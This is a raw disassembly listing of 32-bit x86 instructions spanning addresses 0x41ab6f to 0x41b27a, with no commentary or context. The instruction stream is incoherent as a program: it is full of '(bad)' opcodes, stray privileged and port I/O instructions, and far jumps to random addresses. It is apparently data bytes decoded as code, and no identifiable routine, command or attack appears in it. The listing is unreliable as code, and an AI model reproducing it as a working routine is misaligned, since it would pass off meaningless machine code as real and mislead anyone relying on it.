  41ab6f:	fild   QWORD PTR [ecx]
  41ab71:	jb     0x41ab9f
  41ab73:	in     al,0x65
  41ab75:	loope  0x41ab93
  41ab77:	push   ebx
  41ab78:	nop
  41ab79:	xor    dh,cl
  41ab7b:	push   eax
  41ab7c:	fcom   QWORD PTR [eax-0x57f84f4f]
  41ab82:	cwde   
  41ab83:	inc    ebx
  41ab84:	scas   al,BYTE PTR es:[edi]
  41ab85:	xlat   BYTE PTR ds:[ebx]
  41ab86:	jmp    0x41ab77
  41ab88:	(bad)  
  41ab89:	pop    ebx
  41ab8a:	retf   
  41ab8b:	jge    0x41abab
  41ab8d:	inc    ebx
  41ab8e:	(bad)  
  41ab8f:	lods   eax,DWORD PTR ds:[esi]
  41ab90:	enter  0x3c80,0x63
  41ab94:	adc    dh,BYTE PTR [edi+0x50f6d812]
  41ab9a:	sbb    al,0x67
  41ab9c:	mov    al,0x28
  41ab9e:	add    al,0xe1
  41aba0:	cdq    
  41aba1:	pop    ecx
  41aba2:	mov    BYTE PTR [edi],dh
  41aba4:	into   
  41aba5:	mov    WORD PTR [edi+eiz*8-0x2bee3db3],es
  41abac:	scas   al,BYTE PTR es:[edi]
  41abad:	cld    
  41abae:	push   ss
  41abaf:	idiv   DWORD PTR [ecx+0x63]
  41abb2:	and    BYTE PTR ds:0x5be4980,bh
  41abb8:	jbe    0x41ab78
  41abba:	ins    DWORD PTR es:[edi],dx
  41abbb:	mov    ecx,ecx
  41abbd:	pop    esi
  41abbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abbf:	retf   0x80d3
  41abc2:	fwait
  41abc3:	jl     0x41ac01
  41abc5:	adc    BYTE PTR [ebx],bl
  41abc7:	scas   al,BYTE PTR es:[edi]
  41abc8:	mov    WORD PTR [ebx],ss
  41abca:	in     eax,0x53
  41abcc:	jns    0x41abd5
  41abce:	int    0xcf
  41abd0:	std    
  41abd1:	mov    dh,0x31
  41abd3:	jl     0x41ab5f
  41abd5:	mov    dl,0xfe
  41abd7:	cmp    esp,ecx
  41abd9:	in     eax,dx
  41abda:	mov    BYTE PTR [edi],cl
  41abdc:	cwde   
  41abdd:	outs   dx,BYTE PTR ds:[esi]
  41abde:	fsubr  st(6),st
  41abe0:	aas    
  41abe1:	sub    edx,eax
  41abe3:	push   esi
  41abe4:	sahf   
  41abe5:	push   ebp
  41abe6:	(bad)  
  41abe7:	adc    eax,0x7a50372c
  41abec:	inc    ecx
  41abed:	(bad)  
  41abee:	lods   eax,DWORD PTR ds:[esi]
  41abef:	gs or  esp,ecx
  41abf2:	and    DWORD PTR [edx+0x38],0xffffffc2
  41abf6:	xor    ch,BYTE PTR [edx-0x211ae593]
  41abfc:	es in  eax,0x72
  41abff:	push   ds
  41ac00:	mul    DWORD PTR [eax+0x77]
  41ac03:	mov    esp,0xdc5cac55
  41ac08:	dec    esi
  41ac09:	test   BYTE PTR [ebx+eax*8],bl
  41ac0c:	mov    dh,0xb4
  41ac0e:	imul   edi,DWORD PTR [ebx+0x177e12ac],0xffffff8d
  41ac15:	retf   0x7fea
  41ac18:	mov    dl,0xd3
  41ac1a:	mov    BYTE PTR [ecx],dl
  41ac1c:	push   esp
  41ac1d:	mov    edi,0x34bdd2b3
  41ac22:	push   edx
  41ac23:	jmp    0x5ed8a985
  41ac28:	inc    cx
  41ac2a:	arpl   WORD PTR [ebx],bp
  41ac2c:	ret    
  41ac2d:	shl    BYTE PTR [edx+0x224fef29],cl
  41ac33:	pop    ecx
  41ac34:	out    dx,al
  41ac35:	(bad)  
  41ac36:	(bad)
  41ac3a:	cdq    
  41ac3b:	jne    0x41ac9e
  41ac3d:	jle    0x41ac15
  41ac3f:	mov    esp,DWORD PTR [esi]
  41ac41:	push   esi
  41ac42:	inc    eax
  41ac43:	cld    
  41ac44:	push   ds
  41ac45:	lods   eax,DWORD PTR ds:[esi]
  41ac46:	ins    BYTE PTR es:[edi],dx
  41ac47:	repz dec ecx
  41ac49:	dec    eax
  41ac4a:	add    DWORD PTR [ebx+0x2ab01e62],ecx
  41ac50:	pop    ecx
  41ac51:	cmp    dh,cl
  41ac53:	(bad)  
  41ac54:	popf   
  41ac55:	hlt    
  41ac56:	xchg   DWORD PTR [edi-0x7e],esp
  41ac59:	fs nop
  41ac5b:	ja     0x41aca6
  41ac5d:	mov    al,0x65
  41ac5f:	(bad)  
  41ac60:	leave  
  41ac61:	or     DWORD PTR [esi-0x7c9b93f0],edi
  41ac67:	xchg   DWORD PTR [eax-0x4946e937],ebx
  41ac6d:	mov    eax,ds:0xb459609c
  41ac72:	test   al,0x28
  41ac74:	imul   esp,DWORD PTR [ecx],0x2b368bbf
  41ac7a:	lods   eax,DWORD PTR ds:[esi]
  41ac7b:	xchg   ebx,eax
  41ac7c:	ret    
  41ac7d:	sbb    edi,DWORD PTR [eax-0x4242cb3d]
  41ac83:	popf   
  41ac84:	jnp    0x41ac81
  41ac86:	dec    ebx
  41ac87:	nop
  41ac88:	dec    eax
  41ac89:	dec    ecx
  41ac8a:	jb     0x41ac7b
  41ac8c:	or     ebp,DWORD PTR [ecx+0x42c2e8d3]
  41ac92:	sar    DWORD PTR [esi],0xb7
  41ac95:	mov    bl,0xd5
  41ac97:	pushf  
  41ac98:	in     al,dx
  41ac99:	jecxz  0x41acbd
  41ac9b:	shl    DWORD PTR [eax],cl
  41ac9d:	pop    ebx
  41ac9e:	cdq    
  41ac9f:	fmul   st(6),st
  41aca1:	pop    esi
  41aca2:	out    0x1d,al
  41aca4:	jge    0x41ad08
  41aca6:	cmc    
  41aca7:	jge    0x41ac74
  41aca9:	mov    ecx,0x2ec324ae
  41acae:	ds mov ch,al
  41acb1:	sub    eax,DWORD PTR [eax+0x3e]
  41acb4:	lods   al,BYTE PTR ds:[esi]
  41acb5:	xchg   esi,eax
  41acb6:	out    0x79,eax
  41acb8:	fld    DWORD PTR ds:0x4b53de80
  41acbe:	lods   al,BYTE PTR ds:[esi]
  41acbf:	jge    0x41ac46
  41acc1:	pop    ds
  41acc2:	aad    0x79
  41acc4:	out    0x3f,eax
  41acc6:	mov    bl,0xbd
  41acc8:	mov    ebx,0x6323adba
  41accd:	rol    DWORD PTR [edi+0x100a19b1],cl
  41acd3:	aad    0x66
  41acd5:	fidivr DWORD PTR [eax+0x49]
  41acd8:	ret    
  41acd9:	ror    BYTE PTR [esi],1
  41acdb:	hlt    
  41acdc:	adc    DWORD PTR [esi-0xd],ebp
  41acdf:	xor    DWORD PTR es:[esi-0x32685fd2],edx
  41ace6:	jbe    0x41acba
  41ace8:	dec    eax
  41ace9:	outs   dx,BYTE PTR ds:[esi]
  41acea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aceb:	lods   eax,DWORD PTR ds:[esi]
  41acec:	jmp    0xef998745
  41acf1:	xor    ebx,ebp
  41acf3:	cmp    esp,eax
  41acf5:	cmp    eax,0x87270699
  41acfa:	iret   
  41acfb:	pop    es
  41acfc:	int    0x18
  41acfe:	ss mov dh,0xc
  41ad01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad02:	mov    ds:0xeceef46b,al
  41ad07:	add    BYTE PTR [edi],0xb
  41ad0a:	or     BYTE PTR [edi+ecx*8+0x1014f73b],dl
  41ad11:	or     bl,BYTE PTR [edx-0x1ffb4bfb]
  41ad17:	test   BYTE PTR [esi+edx*4+0x11],0x33
  41ad1c:	es je  0x41ad50
  41ad1f:	loop   0x41ad15
  41ad21:	mov    al,BYTE PTR [ebx-0x5ed1fe56]
  41ad27:	ja     0x41ad38
  41ad29:	fidivr WORD PTR [edi]
  41ad2c:	arpl   WORD PTR [ebp-0x79baaf37],sp
  41ad32:	xchg   ebp,eax
  41ad33:	sahf   
  41ad34:	(bad)  
  41ad35:	clc    
  41ad36:	int3   
  41ad37:	mov    eax,ds:0x45017314
  41ad3c:	lock sbb BYTE PTR [ebx+edi*4+0x3163d020],0xdc
  41ad45:	mov    esp,DWORD PTR [eax+0x74bb335e]
  41ad4b:	in     eax,dx
  41ad4c:	jl     0x41ad43
  41ad4e:	jae    0x41ad71
  41ad50:	mov    ah,0xef
  41ad52:	sub    BYTE PTR [edi+0x44],ah
  41ad55:	js     0x41aceb
  41ad57:	and    eax,0x253738a
  41ad5c:	fsubp  st(1),st
  41ad5e:	jl     0x41ad3b
  41ad60:	pop    edx
  41ad61:	push   eax
  41ad62:	pop    es
  41ad63:	pop    ebp
  41ad64:	sub    DWORD PTR [ebx],0x44b008ca
  41ad6a:	retf   
  41ad6b:	inc    esi
  41ad6c:	pop    edi
  41ad6d:	cmc    
  41ad6e:	sub    edx,DWORD PTR [ecx-0x7d29ad75]
  41ad74:	stc    
  41ad75:	push   ds
  41ad76:	adc    DWORD PTR [edi-0x4a],edi
  41ad79:	(bad)  
  41ad7a:	fcomi  st,st(6)
  41ad7c:	dec    ecx
  41ad7d:	mov    al,ds:0xb16f677d
  41ad82:	leave  
  41ad83:	stc    
  41ad84:	cwde   
  41ad85:	sar    BYTE PTR [ecx+eiz*2],cl
  41ad88:	fdiv   DWORD PTR [ebp+0x48b33389]
  41ad8e:	mov    ebp,0x9c21e8a1
  41ad93:	mov    esp,fs
  41ad95:	cld    
  41ad96:	stc    
  41ad97:	adc    al,0xa0
  41ad99:	int    0xb9
  41ad9b:	mov    eax,ds:0x25bd184
  41ada0:	cld    
  41ada1:	test   al,0xcd
  41ada3:	jae    0x41ad7a
  41ada5:	push   ebp
  41ada6:	or     DWORD PTR ds:0x5c2dd35c,esp
  41adac:	push   es
  41adad:	or     ebp,DWORD PTR [esi+0x4e]
  41adb0:	mov    esi,ss
  41adb2:	in     al,dx
  41adb3:	jo     0x41ad41
  41adb5:	inc    esp
  41adb6:	call   0x16f4:0x1499090
  41adbd:	ds push esi
  41adbf:	lds    eax,FWORD PTR [ecx]
  41adc1:	pop    es
  41adc2:	add    DWORD PTR [ecx],eax
  41adc4:	jl     0x41ad75
  41adc6:	xchg   ebx,eax
  41adc7:	outs   dx,DWORD PTR ds:[esi]
  41adc8:	in     al,0x3c
  41adca:	ficomp WORD PTR [ebx+0x3d81065e]
  41add0:	(bad)  
  41add1:	jge    0x41ad9a
  41add3:	push   esp
  41add4:	and    bh,BYTE PTR [ebp+0x2f]
  41add7:	sti    
  41add8:	sbb    ebx,esi
  41adda:	mov    esi,0x2e60bfd4
  41addf:	mov    dh,0x33
  41ade1:	sub    DWORD PTR [edx+0x68],ebx
  41ade4:	jns    0x41ad78
  41ade6:	push   edx
  41ade7:	jne    0x41ad93
  41ade9:	pop    ebp
  41adea:	sub    BYTE PTR [ebx-0x15c29e34],bh
  41adf0:	push   esi
  41adf1:	mov    al,0x24
  41adf3:	xor    ch,BYTE PTR [ebp-0x5c]
  41adf6:	ins    DWORD PTR es:[edi],dx
  41adf7:	aaa    
  41adf8:	fcom   QWORD PTR [edi]
  41adfa:	dec    eax
  41adfb:	and    dl,ch
  41adfd:	jmp    0xac3f:0x6dbad103
  41ae04:	imul   ebp,DWORD PTR [eax-0xa],0x30
  41ae08:	xor    dh,BYTE PTR [eax]
  41ae0a:	fsubp  st(5),st
  41ae0c:	xchg   esi,eax
  41ae0d:	mov    dl,BYTE PTR [edx-0x20]
  41ae10:	push   cs
  41ae11:	test   DWORD PTR [ecx],ecx
  41ae13:	or     ebx,edx
  41ae15:	ret    
  41ae16:	add    BYTE PTR [esi],dl
  41ae18:	mov    dl,0xb
  41ae1a:	mov    cl,0x98
  41ae1c:	fmul   QWORD PTR [eax+ebp*1]
  41ae1f:	mov    ebp,0xd86d170f
  41ae24:	jae    0x41adf1
  41ae26:	mov    al,0x16
  41ae28:	adc    ecx,0xffffff98
  41ae2b:	cmp    eax,0xdf6384cc
  41ae30:	or     al,cl
  41ae32:	jns    0x41ade9
  41ae34:	lea    eax,[ecx+ecx*8]
  41ae37:	push   ds
  41ae38:	inc    esi
  41ae39:	paddusw mm2,QWORD PTR [edi+0xa]
  41ae3d:	adc    al,0x44
  41ae3f:	clc    
  41ae40:	adc    eax,0x2ca5768
  41ae45:	lds    esp,FWORD PTR [ebx+0x48]
  41ae48:	lahf   
  41ae49:	add    edi,ebp
  41ae4b:	mov    ah,0x3b
  41ae4d:	sub    al,0xcc
  41ae4f:	stos   BYTE PTR es:[edi],al
  41ae50:	int    0x49
  41ae52:	inc    ecx
  41ae53:	popa   
  41ae54:	(bad)  
  41ae55:	mov    eax,DWORD PTR [ebx-0x3d934261]
  41ae5b:	rcr    BYTE PTR [eax-0x5c],cl
  41ae5e:	hlt    
  41ae5f:	mov    eax,0x5bb13127
  41ae64:	ror    ebp,cl
  41ae66:	add    al,0xdf
  41ae68:	xchg   esp,eax
  41ae69:	std    
  41ae6a:	lods   al,BYTE PTR es:[esi]
  41ae6c:	xor    al,0xf3
  41ae6e:	dec    ebx
  41ae6f:	fild   WORD PTR [ecx]
  41ae71:	cmp    edi,esi
  41ae73:	sti    
  41ae74:	adc    al,0x52
  41ae76:	int3   
  41ae77:	lds    edx,FWORD PTR [edx+0x16891494]
  41ae7d:	push   ecx
  41ae7e:	outs   dx,BYTE PTR ds:[esi]
  41ae7f:	jmp    0x41aed6
  41ae81:	cmp    al,0xf8
  41ae83:	jb     0x41ae49
  41ae85:	xchg   edi,eax
  41ae86:	dec    esi
  41ae87:	inc    esp
  41ae88:	in     eax,0x5
  41ae8a:	dec    edi
  41ae8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae8c:	mov    ds:0x53cb1ced,al
  41ae91:	mov    al,ds:0xa7caac62
  41ae96:	jmp    FWORD PTR [eax+0x79]
  41ae99:	cmp    BYTE PTR [eax+0x3],0x63
  41ae9d:	mov    esp,0x941a6461
  41aea2:	fsubr  DWORD PTR [ecx-0x6d60c0f7]
  41aea8:	setb   BYTE PTR [edi+esi*2+0x21]
  41aead:	repnz mov edi,0xa747eb84
  41aeb3:	jg     0x41ae4e
  41aeb5:	and    bh,bh
  41aeb7:	das    
  41aeb8:	jp     0x41af30
  41aeba:	arpl   WORD PTR [esi+0x40],bp
  41aebd:	dec    eax
  41aebe:	ret    
  41aebf:	les    esp,FWORD PTR [ebp+eiz*2+0x67]
  41aec3:	adc    al,0xfc
  41aec5:	hlt    
  41aec6:	jmp    DWORD PTR [ebx+0x18]
  41aec9:	(bad)  
  41aeca:	fstp   QWORD PTR [ecx+ebp*8-0x3645f85a]
  41aed1:	rcl    BYTE PTR [ecx],1
  41aed3:	dec    ebp
  41aed4:	pop    es
  41aed5:	fsincos 
  41aed7:	(bad)  
  41aed8:	sbb    al,0x1c
  41aeda:	dec    ebx
  41aedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aedc:	and    DWORD PTR ds:0x8d990e73,esp
  41aee2:	pusha  
  41aee3:	jp     0x41aefc
  41aee5:	fcom   DWORD PTR [edi-0x34257f68]
  41aeeb:	dec    DWORD PTR [edi]
  41aeed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeee:	jge    0x41aea6
  41aef0:	(bad)  
  41aef1:	loopne 0x41aede
  41aef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef4:	jne    0x41aed5
  41aef6:	inc    ebp
  41aef7:	gs jp  0x41af70
  41aefa:	test   DWORD PTR [ebp+0x66],0xc0689395
  41af01:	(bad)  
  41af02:	ins    DWORD PTR es:[edi],dx
  41af03:	enter  0x73c8,0xf3
  41af07:	into   
  41af08:	(bad)  
  41af09:	pop    eax
  41af0a:	icebp  
  41af0b:	jno    0x41aef5
  41af0d:	rcr    DWORD PTR [esi-0x4],1
  41af10:	mov    ah,0x68
  41af12:	mov    edi,0x4972b4dc
  41af17:	mov    DWORD PTR [edi],ecx
  41af19:	test   DWORD PTR [edi],edi
  41af1b:	int    0x1f
  41af1d:	repz mov al,0x7e
  41af20:	add    al,0xed
  41af22:	into   
  41af23:	gs or  ax,0xbde3
  41af28:	inc    eax
  41af29:	ret    0xe410
  41af2c:	cld    
  41af2d:	inc    ecx
  41af2e:	imul   esi,DWORD PTR ds:0xfa012e5f,0xd848029f
  41af38:	mov    WORD PTR [ebx+0x18],ss
  41af3b:	mov    cl,0xfb
  41af3d:	outs   dx,DWORD PTR ds:[esi]
  41af3e:	or     BYTE PTR [ebp+0x22e50b8a],ch
  41af44:	and    eax,0x509ca29e
  41af49:	mov    edx,0xc8acb82
  41af4e:	dec    ebp
  41af4f:	out    dx,al
  41af50:	push   ebp
  41af51:	adc    al,0x9d
  41af53:	jmp    0x6be06966
  41af58:	(bad)  
  41af5a:	(bad)  
  41af5b:	inc    BYTE PTR [esi]
  41af5d:	sahf   
  41af5e:	jg     0x41afcb
  41af60:	popf   
  41af61:	sar    BYTE PTR [eax-0x2e63aae8],0xa2
  41af68:	shr    DWORD PTR [edx],0x23
  41af6b:	clc    
  41af6c:	jg     0x41aefc
  41af6e:	into   
  41af6f:	pop    edi
  41af70:	nop
  41af71:	hlt    
  41af72:	push   esi
  41af73:	jecxz  0x41af78
  41af75:	add    al,0x51
  41af77:	rcr    BYTE PTR [esi+0x70],0x71
  41af7b:	mov    DWORD PTR ss:[eax-0x3f],esi
  41af7f:	jp     0x41af69
  41af81:	xchg   edx,eax
  41af82:	sub    al,BYTE PTR [ebx-0x38]
  41af85:	inc    esp
  41af86:	mov    dl,0xd0
  41af88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af89:	sub    eax,0x9c02d2d2
  41af8e:	mov    bh,0xdf
  41af90:	fstp   st(1)
  41af92:	sub    al,0x5e
  41af94:	xlat   BYTE PTR ds:[ebx]
  41af95:	(bad)  
  41af96:	int3   
  41af97:	add    ecx,0xffffff84
  41af9a:	sub    DWORD PTR [edi-0x44],esp
  41af9d:	rcl    BYTE PTR [edi+0xcad182b],1
  41afa3:	xchg   edi,eax
  41afa4:	jge    0x41af64
  41afa6:	pop    ds
  41afa7:	adc    eax,0xa0c39766
  41afac:	outs   dx,DWORD PTR ds:[esi]
  41afad:	fwait
  41afae:	loope  0x41b009
  41afb0:	lock fnstcw WORD PTR [eax-0x17]
  41afb4:	dec    ecx
  41afb5:	jl     0x41af70
  41afb7:	sbb    eax,0x205c218c
  41afbc:	lds    esp,FWORD PTR ds:0x1755d3fe
  41afc2:	mov    ah,0xa2
  41afc4:	mov    BYTE PTR [esi+0x55d50019],ah
  41afca:	mov    bl,0x41
  41afcc:	and    eax,0xac2c268e
  41afd1:	mov    ecx,edi
  41afd3:	sub    DWORD PTR [edx-0x5],0x6
  41afd7:	mov    eax,ds:0x4765f52
  41afdc:	(bad)  
  41afdd:	jmp    0xe3ba:0xa617b88b
  41afe4:	add    eax,DWORD PTR [si+0xcb1]
  41afe9:	repz mov eax,ds:0x8a927150
  41afef:	jl     0x41b03c
  41aff1:	fist   DWORD PTR [ebp+0x16]
  41aff4:	jb     0x41b042
  41aff6:	pop    esp
  41aff7:	lods   eax,DWORD PTR ds:[esi]
  41aff8:	stos   DWORD PTR es:[edi],eax
  41aff9:	out    0xdc,eax
  41affb:	aad    0x65
  41affd:	mov    edi,0xcd73472c
  41b002:	or     BYTE PTR [edi-0x30],cl
  41b005:	je     0x41afcd
  41b007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b008:	aas    
  41b009:	jecxz  0x41b04d
  41b00b:	(bad)  
  41b00c:	lods   al,BYTE PTR ds:[esi]
  41b00d:	and    al,0x3e
  41b00f:	cld    
  41b010:	lea    ebp,[edi+edx*1+0x6e]
  41b014:	dec    esp
  41b015:	retf   0x3480
  41b018:	sahf   
  41b019:	dec    edx
  41b01a:	inc    edx
  41b01b:	retf   0xc1ed
  41b01e:	pop    ebp
  41b01f:	mov    al,BYTE PTR [eax-0x67]
  41b022:	push   ebp
  41b023:	inc    ecx
  41b024:	into   
  41b025:	and    ecx,DWORD PTR [esi+0x33]
  41b028:	dec    esp
  41b029:	dec    esi
  41b02a:	leave  
  41b02b:	inc    edi
  41b02c:	and    al,0x9
  41b02e:	cmp    BYTE PTR [esp+ebx*2+0x49],ah
  41b032:	(bad)  
  41b033:	out    dx,eax
  41b034:	and    DWORD PTR [ebx+0x6],edi
  41b037:	mov    ebx,0x4230d820
  41b03c:	push   esi
  41b03d:	outs   dx,DWORD PTR ds:[esi]
  41b03e:	pop    ss
  41b03f:	pop    ecx
  41b040:	call   0xaad7222e
  41b045:	pop    es
  41b046:	ret    0xd320
  41b049:	sub    DWORD PTR [edx+0x13c6cd64],ebx
  41b04f:	xor    ah,dl
  41b051:	push   ds
  41b052:	mov    ds:0x6a5468bf,al
  41b057:	sub    ch,dl
  41b059:	fild   WORD PTR [ebx+0xf557883]
  41b05f:	in     eax,dx
  41b060:	dec    esp
  41b061:	repnz xchg edi,eax
  41b063:	jnp    0x41b021
  41b065:	jo     0x41b00f
  41b067:	daa    
  41b068:	(bad)  
  41b069:	rol    DWORD PTR [eax+0x64],1
  41b06c:	and    BYTE PTR [edx],bl
  41b06e:	sti    
  41b06f:	loopne 0x41b09b
  41b071:	mov    esp,ebp
  41b073:	pop    ebx
  41b074:	sbb    DWORD PTR [ebp-0x22fb8d14],esi
  41b07a:	gs stos BYTE PTR es:[edi],al
  41b07c:	loopne 0x41b09d
  41b07e:	ror    BYTE PTR [ebx-0x37],0x30
  41b082:	jp     0x41b009
  41b084:	and    cl,dh
  41b086:	movdqa xmm3,xmm4
  41b08a:	or     DWORD PTR [ecx-0x2b],0x4c
  41b08e:	or     eax,0x28165674
  41b093:	mov    ds:0x4d68167c,eax
  41b098:	push   es
  41b099:	jmp    0x2584a9ce
  41b09e:	xchg   esi,eax
  41b09f:	stos   DWORD PTR es:[edi],eax
  41b0a0:	pop    edi
  41b0a1:	aaa    
  41b0a2:	aam    0x42
  41b0a4:	js     0x41b02d
  41b0a6:	es loop 0x41b0d7
  41b0a9:	stos   BYTE PTR es:[edi],al
  41b0aa:	out    dx,eax
  41b0ab:	js     0x41b0b0
  41b0ad:	adc    BYTE PTR [ecx+0x59],al
  41b0b0:	hlt    
  41b0b1:	das    
  41b0b2:	sub    eax,ecx
  41b0b4:	pop    edx
  41b0b5:	jbe    0x41b104
  41b0b7:	add    BYTE PTR [edi],dl
  41b0b9:	gs (bad) 
  41b0bb:	js     0x41b0cf
  41b0bd:	push   ebp
  41b0be:	pop    edi
  41b0bf:	xlat   BYTE PTR ds:[ebx]
  41b0c0:	xchg   ebx,eax
  41b0c1:	inc    ebx
  41b0c2:	cmp    al,0x86
  41b0c4:	outs   dx,BYTE PTR ds:[esi]
  41b0c5:	mov    al,0x42
  41b0c7:	xor    DWORD PTR [edi],ecx
  41b0c9:	sub    dl,BYTE PTR [edi+0x25f97cce]
  41b0cf:	std    
  41b0d0:	lods   al,BYTE PTR ds:[esi]
  41b0d1:	inc    edx
  41b0d2:	cmc    
  41b0d3:	iret   
  41b0d4:	xor    eax,0xe3996764
  41b0d9:	jmp    0x70a7:0x254c03d9
  41b0e0:	pop    ebp
  41b0e1:	jbe    0x41b0d5
  41b0e3:	and    eax,0xe6bb4f66
  41b0e8:	aaa    
  41b0e9:	add    al,0xb6
  41b0eb:	cmp    dh,BYTE PTR [esi+eax*8-0x5a]
  41b0ef:	push   eax
  41b0f0:	push   ebx
  41b0f1:	test   BYTE PTR [edx-0x157a32f8],bl
  41b0f7:	xchg   esi,eax
  41b0f8:	aam    0x9a
  41b0fa:	cmp    eax,DWORD PTR [edx+edi*1-0x120f51b9]
  41b101:	sti    
  41b102:	xchg   ebp,eax
  41b103:	stc    
  41b104:	shl    BYTE PTR [ecx],1
  41b106:	test   DWORD PTR [edi+0x14a337f6],esp
  41b10c:	add    BYTE PTR [ebx+0x7a7002d3],bh
  41b112:	stos   DWORD PTR es:[edi],eax
  41b113:	cwde   
  41b114:	dec    edx
  41b115:	enter  0xf2ed,0x74
  41b119:	adc    ecx,ebx
  41b11b:	loope  0x41b0b6
  41b11d:	aam    0xc0
  41b11f:	adc    edi,DWORD PTR [eax+0x51]
  41b122:	dec    esp
  41b123:	inc    ebx
  41b124:	mov    eax,ds:0x5f55ad82
  41b129:	mov    eax,0x1964bf9b
  41b12e:	cli    
  41b12f:	push   cs
  41b130:	add    ebp,DWORD PTR [edi]
  41b132:	fisttp QWORD PTR [ebp+0x3e]
  41b135:	mov    gs,WORD PTR [edi+0x5b]
  41b138:	cmp    ebp,DWORD PTR [eax-0x4b]
  41b13b:	mov    cl,0x55
  41b13d:	fild   QWORD PTR [edx-0x7b]
  41b140:	add    DWORD PTR [esi],edi
  41b142:	fimul  WORD PTR [ebx]
  41b144:	xchg   edi,eax
  41b145:	into   
  41b146:	loope  0x41b105
  41b148:	loope  0x41b15a
  41b14a:	clc    
  41b14b:	mov    ebp,cs
  41b14d:	jno    0x41b1ae
  41b14f:	mov    ebp,0x490e967f
  41b154:	in     al,0x74
  41b156:	mov    ebx,0x36796e8d
  41b15b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15c:	enter  0x2b1d,0xbe
  41b160:	mov    bh,0x6e
  41b162:	ret    0x5c9d
  41b165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b166:	jmp    0x74b67fbf
  41b16b:	jmp    0x41b1c7
  41b16d:	iret   
  41b16e:	fldenv [edi]
  41b170:	out    0xc3,al
  41b172:	push   0xffffffdc
  41b174:	jae    0x41b174
  41b176:	pop    ecx
  41b177:	xchg   esi,eax
  41b178:	scas   eax,DWORD PTR es:[edi]
  41b179:	outs   dx,DWORD PTR ds:[esi]
  41b17a:	mov    ah,0xd0
  41b17c:	repz test al,0x91
  41b17f:	jae    0x41b200
  41b181:	cmc    
  41b182:	addr16 jmp 0xb77fb6b6
  41b188:	out    dx,al
  41b189:	mov    WORD PTR [ecx+0x2ac1dac1],?
  41b18f:	jae    0x41b146
  41b191:	cmp    ebx,DWORD PTR ds:0x942e7d2f
  41b197:	inc    ecx
  41b198:	inc    esp
  41b199:	or     edx,DWORD PTR [ebx+ebp*1-0x2f]
  41b19d:	inc    esi
  41b19e:	push   0x79
  41b1a0:	imul   ecx,DWORD PTR [edi+0x7139f5aa],0x2c8ae554
  41b1aa:	push   edx
  41b1ab:	ret    
  41b1ac:	test   DWORD PTR [ecx+ebp*1],edx
  41b1af:	mov    ds:0xe1a48b9e,eax
  41b1b4:	jnp    0x41b172
  41b1b6:	xchg   DWORD PTR [esp+esi*8],eax
  41b1b9:	xchg   ecx,eax
  41b1ba:	xchg   BYTE PTR [esi],cl
  41b1bc:	rcl    DWORD PTR [edx+0x4d],0x24
  41b1c0:	xchg   ecx,eax
  41b1c1:	daa    
  41b1c2:	dec    ebp
  41b1c3:	xchg   ebx,eax
  41b1c4:	(bad)  
  41b1c5:	pop    ebx
  41b1c6:	mov    ecx,0xa528eeb3
  41b1cb:	push   edi
  41b1cc:	test   al,0xdd
  41b1ce:	mov    gs,WORD PTR [ecx+0x7025f37b]
  41b1d4:	jo     0x41b159
  41b1d6:	js     0x41b1c8
  41b1d8:	outs   dx,BYTE PTR ds:[esi]
  41b1d9:	punpcklbw mm6,DWORD PTR [ecx+0x6e4081da]
  41b1e0:	mov    es,edi
  41b1e2:	cmp    BYTE PTR [eax-0x7bd8a103],cl
  41b1e8:	int3   
  41b1e9:	mov    ebp,0x81a61109
  41b1ee:	iret   
  41b1ef:	inc    ecx
  41b1f0:	imul   ebp,DWORD PTR [edx+0x2b5b59bb],0xc
  41b1f7:	push   esp
  41b1f8:	js     0x41b1cc
  41b1fa:	sti    
  41b1fb:	mov    bh,0x5d
  41b1fd:	xchg   edi,eax
  41b1fe:	cwde   
  41b1ff:	sub    bh,BYTE PTR [eax]
  41b201:	lea    edi,[eax*4-0x6676379c]
  41b208:	and    al,0xbd
  41b20a:	jnp    0x41b226
  41b20c:	ins    BYTE PTR es:[edi],dx
  41b20d:	pop    ecx
  41b20e:	dec    ebx
  41b20f:	jmp    0x41b222
  41b211:	pop    ebx
  41b212:	pop    esi
  41b213:	fwait
  41b214:	jle    0x41b265
  41b216:	fwait
  41b217:	out    0x8a,al
  41b219:	jecxz  0x41b1b8
  41b21b:	clc    
  41b21c:	dec    esi
  41b21d:	inc    esi
  41b21e:	dec    eax
  41b21f:	retf   
  41b220:	pop    ecx
  41b221:	fistp  WORD PTR [esi-0x12]
  41b224:	data16 mov ds:0xe84f9277,al
  41b22a:	push   ss
  41b22b:	in     al,dx
  41b22c:	xchg   ebp,eax
  41b22d:	stc    
  41b22e:	adc    BYTE PTR ds:0x8fd1e476,0x4b
  41b235:	push   es
  41b236:	mov    al,ds:0x10adef94
  41b23b:	fistp  QWORD PTR [edx]
  41b23d:	add    DWORD PTR [ecx],edi
  41b23f:	push   eax
  41b240:	je     0x41b245
  41b242:	push   esp
  41b243:	nop
  41b244:	call   0x95e723f8
  41b249:	fstp   QWORD PTR [edi-0x7]
  41b24c:	cli    
  41b24d:	loop   0x41b25d
  41b24f:	adc    BYTE PTR [edi+0x60],bh
  41b252:	adc    eax,0x9f51b797
  41b257:	test   BYTE PTR [ebx],ch
  41b259:	jo     0x41b2d5
  41b25b:	lods   eax,DWORD PTR ds:[esi]
  41b25c:	shl    DWORD PTR [ebp+0x6],cl
  41b25f:	push   ds
  41b260:	ja     0x41b1e6
  41b262:	sub    BYTE PTR [ebp-0x7ef8b457],ch
  41b268:	in     al,0x28
  41b26a:	into   
  41b26b:	rcl    BYTE PTR [edx],cl
  41b26d:	jb     0x41b2c4
  41b26f:	adc    ebp,DWORD PTR [eax]
  41b271:	dec    edi
  41b272:	das    
  41b273:	and    BYTE PTR [edi+0x27],dl
  41b276:	xchg   esp,eax
  41b277:	lea    ebp,[edx]
  41b279:	outs   dx,BYTE PTR ds:[esi]
  41b27a:	sub    eax,0xf0d407d8
